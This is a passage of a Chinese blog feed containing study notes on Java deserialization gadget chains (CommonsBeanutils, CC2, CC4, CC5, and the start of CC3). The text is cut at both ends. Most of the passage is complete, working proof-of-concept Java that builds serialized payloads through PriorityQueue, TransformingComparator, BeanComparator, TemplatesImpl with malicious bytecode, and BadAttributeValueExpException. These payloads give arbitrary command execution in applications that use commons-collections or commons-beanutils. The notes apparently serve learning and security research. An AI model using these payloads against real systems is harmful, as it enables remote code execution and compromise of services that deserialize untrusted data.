src="image-20230327200921490.png" alt="image-20230327200921490"></p><p>构造的链图如下</p><p><img src="image-20230327152941135.png" alt="image-20230327152941135"></p><h1 id="CB链的利用">CB链的利用</h1><p>commons-beanutils是Apache Commons项目的一部分,是一个Java工具库,提供了许多操作Java Bean对象的工具类。它可以帮助Java程序员更方便地访问和操作Java Bean对象,从而简化了Java应用程序的开发。</p><p>对于以下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(A,<span class="string">&quot;b&quot;</span>)</span><br></pre></td></tr></table></figure><p>会调用A对象的getb方法</p><p>我们之前在利用TemplatesImpl类执行任意代码的时候是调用的newTransformer方法,而TemplatesImpl类中还有一个getOutputProperties方法正好调用了newTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();<span class="comment">//这里调用了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个类刚好可以用PropertyUtils.getProperty来调用,于是有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesfield.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line">PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);<span class="comment">//这里是outputProperties,不是OutputProperties</span></span><br></pre></td></tr></table></figure><p><img src="image-20230327201309891.png" alt="image-20230327201309891"></p><p>接下来可以找一下调用了getProperty方法的类</p><p><img src="image-20230327201709680.png" alt="image-20230327201709680"></p><p>发现了BeanComparator类的compare方法,这个compare我们之前在cc2的时候见过,当时是调的TransformingComparator#compare,那么我们这里就可以直接把之前cc2构造的poc用起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cc3</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesfield.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面两行实际上没什么用,只是为了让链断开,后面会通过反射将PriorityQueue.comparator改为beanComparator</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(priorityQueue,beanComparator);</span><br><span class="line">test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure><p><img src="image-20230327204500200.png" alt="image-20230327204500200"></p><p>反序列化利用成功！！！</p><p>这里需要注意,实验中使用的commons-beanutils的版本是<code>1.8.3</code>,而ysoserial中使用的版本是<code>1.9.2</code>,所以使用ysoserial来打本实验的时候会出现利用失败</p><p><img src="image-20230327210100012.png" alt="image-20230327210100012"></p><p>参考视频链接：<a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e">Shiro反序列化漏洞</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;环境搭建&lt;/h1&gt;
&lt;p&gt;下载shiro&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之cc2和cc4</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/</id>
    <published>2023-03-26T04:47:37.000Z</published>
    <updated>2023-06-14T11:55:55.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC4">CC4</h1><p>CC4是针对<code>commons-collections4</code>的4.0版本的一条利用链</p><p>主要是利用<code>TransformingComparator</code>类的<code>compare</code>方法调用了ChainedTransformer类的transform(<code>commons-collections3.2的TransformingComparator无法反序列化</code>)</p><p><img src="image-20230326101200961.png" alt="image-20230326101200961"></p><p>而入口则是PriorityQueue类的readObject方法,整体利用链如下：</p><p>PriorityQueue#readObject</p><p>PriorityQueue#heapify</p><p>PriorityQueue#siftDown</p><p>PriorityQueue#siftDownUsingComparator</p><p>TransformingComparator#compare</p><p>所以通过以下构造方法连成一条链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br></pre></td></tr></table></figure><p>但有几个需要注意的逻辑点</p><p>在PriorityQueue#heapify中有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想进入循环则必须满足<code>size&gt;&gt;&gt;1要大于0</code>,即变量 “size” 的二进制表示向右移动一位要大于0,size&gt;1</p><p>所以有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>但是priorityQueue.add()会调用priorityQueue.offer()进而调用priorityQueue.siftUp(),最终到siftUpUsingComparator()调用了compare方法,也就是说在还没有反序列化之前,就已经命令执行了。</p><p>要解决这个问题方法和之前的一样,<code>在add前断开链,add后在把链接上</code></p><p>故最后的序列化poc就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure><h1 id="CC2">CC2</h1><p>前面提到通过类的动态加载,我们只需要运行<code>templates.newTransformer()</code>方法就可以任意命令执行了</p><p>那么我们可以通过InvokerTransformer类来执行这个方法,就可以实现命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">invokerTransformer.transform(templates);</span><br></pre></td></tr></table></figure><p>但我们总会遇到一个问题,就是transform的参数不好控制,之前我们都是采用ChainedTransformer+ConstantTransformer来解决的,但在这里,我们的参数是可控的,</p><p>在PriorityQueue#heapify中要向siftDown传入两个参数,而<code>第二个参数就是我们最终传到transform的参数</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个queue[i]就是我们poc中利用priorityQueue.add方法传入的参数,所以我们只需要传入一个</p><p>templates就可以了</p><p>故最终的poc为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));<span class="comment">//这里不能用ChainedTransformer,否则会报错</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(templates);<span class="comment">//传入templates</span></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure><p>通过这种方法就可以在不用ChainedTransformer和ConstantTransformer的情况下实现反序列化</p><p>最后附上一张CC链的总图：</p><p><img src="image-20230326145828228.png" alt="image-20230326145828228"></p><h1 id="CC5">CC5</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造lazymap</span></span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//构造BadAttributeValueExpException</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//把链断开，用反射重新连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">BadAttribute_class</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val_field</span> <span class="operator">=</span> BadAttribute_class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val_field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">Test.Serialize(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//Test.Unserialize(&quot;test.ser&quot;);</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC4&quot;&gt;CC4&lt;/h1&gt;
&lt;p&gt;CC4是针对&lt;code&gt;commons-collections4&lt;/code&gt;的4.0版本的一条利用链&lt;/p&gt;
&lt;p&gt;主要是利用&lt;code&gt;TransformingComparator&lt;/code&gt;类的&lt;code&gt;compare&lt;</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之类的动态加载与cc3</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B8%8Ecc3/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B8%8Ecc3/</id>
    <published>2023-03-24T08:33:30.000Z</published>
    <updated>2023-06-14T11:55:47.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类的动态加载">类的动态加载</h1><p><code>Java类的动态加载</code>是指在运行时，通过程序代码加载并使用Java类，而不需要在编译时将其全部静态加载。这种方式可以让开发者灵活地根据需要加载所需的类，而不必提前把所有的类都加载到内存中，从而节省内存空间。</p><p>Java提供了一些API来实现动态加载，最常用的是<code>Class.forName()</code>方法和<code>ClassLoader.defineClass()</code>方法。Class.forName()方法可以在运行时动态加载一个类，该方法返回一个Class对象，表示已经被加载的类。ClassLoader.defineClass()方法则是通过程序代码创建一个Java类的字节码，并将其转换为一个Class对象。</p><p>其中我们主要利用到的就是ClassLoader，ClassLoader在加载类的时候有三种方法，分别是<code>loadClass方法</code>、<code>findClass方法</code>以及<code>defineClass方法</code>。</p><p>在查找一个类的时候，ClassLoader首先通过loadClass方法从当前已经加载的所有类和父加载器中寻找类，没有找到的话再通过findClass从自定义类加载器中查找类文件，例如从一个本地文件系统或者远程http服务器上加载类，最终用defineClass方法来将生成的字节码转成Class对象。</p><h2 id="findClass">findClass</h2><p>我们首先来看看通过findClass查找类，写一段恶意类让Java程序加载</p><p>恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span 